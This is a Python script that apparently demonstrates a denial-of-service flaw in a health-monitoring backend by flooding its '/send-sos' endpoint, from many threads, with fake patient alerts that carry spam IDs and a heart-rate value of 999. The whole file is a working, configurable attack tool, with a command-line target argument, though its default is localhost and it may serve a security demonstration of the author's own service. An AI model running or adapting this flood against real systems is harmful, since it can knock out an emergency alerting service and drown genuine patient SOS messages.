#!/usr/bin/env python3
"""
DoS Attack on SNS Publisher

Demonstrates DoS vulnerability through message flooding.
"""

import requests
import threading
import time
import argparse

class SNSDoSAttack:
    def __init__(self, target_url, num_threads=10, requests_per_thread=100):
        self.target_url = target_url
        self.num_threads = num_threads
        self.requests_per_thread = requests_per_thread
        self.success_count = 0
        self.error_count = 0
        self.lock = threading.Lock()
        
    def send_spam_message(self, thread_id):
        for i in range(self.requests_per_thread):
            try:
                payload = {
                    "patient_id": f"SPAM_{thread_id}_{i}",
                    "metric_type": "heart_rate",
                    "value": 999,
                    "threshold": 100,
                    "custom_message": f"SPAM {thread_id}-{i}"
                }
                
                response = requests.post(
                    f"{self.target_url}/send-sos",
                    json=payload,
                    timeout=5
                )
                
                with self.lock:
                    if response.status_code == 200:
                        self.success_count += 1
                    else:
                        self.error_count += 1
                        
            except Exception as e:
                with self.lock:
                    self.error_count += 1
                    
    def run(self):
        print(f"\n{'='*60}")
        print(f"SNS DoS Attack - Targeting Rust Backend")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Threads: {self.num_threads}")
        print(f"Total requests: {self.num_threads * self.requests_per_thread}\n")
        
        start_time = time.time()
        
        threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.send_spam_message, args=(i,))
            threads.append(thread)
            thread.start()
            
        for thread in threads:
            thread.join()
            
        duration = time.time() - start_time
        
        print(f"\n{'='*60}")
        print(f"Attack Completed")
        print(f"{'='*60}")
        print(f"Duration: {duration:.2f}s")
        print(f"Success: {self.success_count}")
        print(f"Failed: {self.error_count}")
        print(f"Rate: {(self.success_count + self.error_count) / duration:.2f} req/s")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', default='http://localhost:5001')
    parser.add_argument('--threads', type=int, default=10)
    parser.add_argument('--requests', type=int, default=100)
    args = parser.parse_args()
    
    attacker = SNSDoSAttack(args.target, args.threads, args.requests)
    attacker.run()

if __name__ == '__main__':
    main()
